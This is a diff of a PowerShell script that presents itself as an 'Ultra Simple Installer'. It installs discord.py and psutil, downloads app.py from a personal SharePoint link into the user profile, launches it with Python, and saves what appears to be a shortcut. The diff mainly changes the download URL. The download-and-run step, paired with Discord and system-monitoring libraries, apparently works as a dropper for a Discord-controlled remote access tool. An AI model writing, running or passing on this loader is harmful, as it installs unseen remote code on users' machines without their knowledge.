@@ -1,3 +1,4 @@
+
 # Ultra Simple Installer
 Write-Host "Setup starting..."
 
@@ -20,7 +21,7 @@ Write-Host "Installing packages..."
 python -m pip install discord.py psutil --user
 
 Write-Host "Downloading app..."
-(New-Object System.Net.WebClient).DownloadFile("https://trioworldacademy1-my.sharepoint.com/:u:/g/personal/namanreddykaliki_trioworldacademy_com/ET8GO_7FfCdImpWbGYD-zREB9WkwjG6K5Zoo9dn0xghp9g?e=UT9Chy&download=1", "$env:USERPROFILE\app.py")
+(New-Object System.Net.WebClient).DownloadFile("https://trioworldacademy1-my.sharepoint.com/:u:/g/personal/namanreddykaliki_trioworldacademy_com/ET8GO_7FfCdImpWbGYD-zREB9WkwjG6K5Zoo9dn0xghp9g?e=PanmFy&download=1", "$env:USERPROFILE\app.py")
 
 Write-Host "Starting app..."
 Start-Process python -ArgumentList "$env:USERPROFILE\app.py"
@@ -35,4 +36,3 @@ $l.Save()
 
 Write-Host "Done! Closing..."
 Start-Sleep -Seconds 2
-
